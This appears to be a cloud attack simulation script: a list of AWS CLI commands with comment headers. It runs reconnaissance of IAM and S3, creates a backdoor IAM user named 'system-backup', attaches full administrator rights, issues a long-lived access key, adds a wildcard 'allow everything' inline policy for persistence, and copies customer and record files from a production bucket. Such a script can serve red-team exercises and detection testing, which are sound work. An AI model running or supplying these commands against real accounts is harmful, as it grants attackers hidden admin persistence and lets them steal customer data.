# Attack Simulation
# Simulated attacker login (manual via console)

# Reconnaissance
aws iam list-users
aws iam list-roles
aws s3 ls
aws s3api list-buckets

# Create backdoor IAM user
aws iam create-user --user-name system-backup

# Attach admin policy
aws iam attach-user-policy \
  --user-name system-backup \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create long-lived access key
aws iam create-access-key --user-name system-backup
aws iam put-user-policy \
  --user-name system-backup \
  --policy-name persistence-policy \
  --policy-document file://inline-policy.json

{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}
aws s3 ls s3://prod-data-bucket
aws s3 cp s3://prod-data-bucket/records.csv .
aws s3 cp s3://prod-data-bucket/customers.json .
